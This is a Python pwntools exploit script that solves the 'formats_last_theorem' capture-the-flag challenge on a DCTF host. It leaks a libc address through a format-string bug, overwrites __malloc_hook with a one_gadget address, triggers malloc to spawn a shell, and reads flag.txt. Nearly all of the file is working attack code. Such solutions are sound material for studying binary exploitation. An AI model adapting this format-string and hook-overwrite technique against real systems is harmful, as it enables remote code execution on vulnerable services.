#!/usr/bin/env python3
import pwn

host = "dctf-chall-formats-last-theorem.westeurope.azurecontainer.io"
port = 7482
target = "formats_last_theorem"

def print_stack(pr, begin, end):
    with open('stack', 'wb') as fd:
        for i in range(begin, end):
            fmt = "{}:%{}$p,".format(i, i)
            pr.sendlineafter("point\n", fmt)
            pr.readline()
            line = pr.readline()
            for a in line.split(b','):
                fd.write(a)

def exploit(remote):
    pwn.context.clear(bits=64)

    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target, env={'LD_PRELOAD':'libc-2.27.so'})


    try:
        elf = pwn.ELF(target, False)
        libc = pwn.ELF('./libc-2.27.so', False)
        # one_gadget libc-2.27.so from libc6_2.27-3ubuntu1.4_amd64.deb
        gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

        payload = "%{}$p".format(23)
        pr.sendlineafter("point\n", payload)
        pr.readline()

        # 0x00007fffffffda08│+0x0088: 0x00007ffff7dfb082  →  <__libc_start_main+231> mov edi, eax
        libc_start_main_addr = int(pr.readline().strip().decode(), 16) - 231
        libc.sym['gadget'] = gadgets[2]
        libc.address = libc_start_main_addr - libc.sym['__libc_start_main']
        print('libc @', hex(libc.address))
        print('gadget @', hex(libc.sym['gadget']))
        print('__libc_start_main @', hex(libc_start_main_addr))
        print('__malloc_hook @', hex(libc.sym['__malloc_hook']))

        stack_offset = 6
        payload = pwn.fmtstr_payload(stack_offset, {libc.sym["__malloc_hook"]:libc.sym['gadget']}, write_size='short')
        print(payload, len(payload))
        pr.sendafter("point\n", payload)
        pr.sendline()

        payload = b"%65537$c"
        pr.sendafter("point\n", payload)
        pr.sendline()
        pr.readline()
        pr.sendline('cat flag.txt')
        print(pr.readall(2))

    except Exception as e:
        print(e)
    finally:
        pr.close()

exploit(True)
